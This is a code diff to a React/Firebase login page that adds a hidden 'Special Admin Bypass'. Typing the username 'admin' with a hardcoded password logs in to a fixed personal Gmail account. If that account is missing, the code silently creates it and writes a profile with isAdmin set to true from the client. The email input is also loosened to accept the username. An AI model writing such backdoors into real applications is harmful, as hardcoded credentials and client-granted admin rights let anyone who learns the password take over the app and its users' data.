@@ -135,7 +135,36 @@ export default function Login() {
         
         toast.success('Account created successfully!');
       } else {
-        await signInWithEmailAndPassword(auth, email, password);
+        // Special Admin Bypass
+        if (email.toLowerCase() === 'admin' && password === 'admin2000') {
+          const adminEmail = 'dragonballsam86@gmail.com'; 
+          try {
+            await signInWithEmailAndPassword(auth, adminEmail, 'admin2000');
+          } catch (err: any) {
+             // If account doesn't exist, try creating it silently
+             if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential') {
+                try {
+                  const result = await createUserWithEmailAndPassword(auth, adminEmail, 'admin2000');
+                  const user = result.user;
+                  await updateProfile(user, { displayName: 'Administrator' });
+                  // Create the profile doc as admin immediately
+                  await setDoc(doc(db, 'users', user.uid), {
+                    uid: user.uid,
+                    name: 'Administrator',
+                    email: adminEmail,
+                    isAdmin: true,
+                    registeredAt: new Date().toISOString()
+                  });
+                } catch (signUpErr) {
+                  throw new Error('Admin initialization failed. Check internet connection.');
+                }
+             } else {
+               throw err;
+             }
+          }
+        } else {
+          await signInWithEmailAndPassword(auth, email, password);
+        }
         toast.success('Welcome back!');
       }
       navigate('/');
@@ -293,15 +322,15 @@ export default function Login() {
                 )}
 
                 <div className="space-y-2">
-                  <label className="text-[10px] uppercase font-black tracking-widest text-white/40 ml-4">Email</label>
+                  <label className="text-[10px] uppercase font-black tracking-widest text-white/40 ml-4">Email or Username</label>
                   <div className="relative">
                     <Mail className="absolute left-6 top-1/2 -translate-y-1/2 text-white/40" size={18} />
                     <input
-                      type="email"
+                      type="text"
                       required
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
-                      placeholder="hello@example.com"
+                      placeholder="admin or email"
                       className="w-full pl-16 pr-6 py-5 bg-white/5 border border-white/10 rounded-[2rem] focus:ring-2 focus:ring-white/20 outline-none transition-all text-white font-bold"
                     />
                   </div>
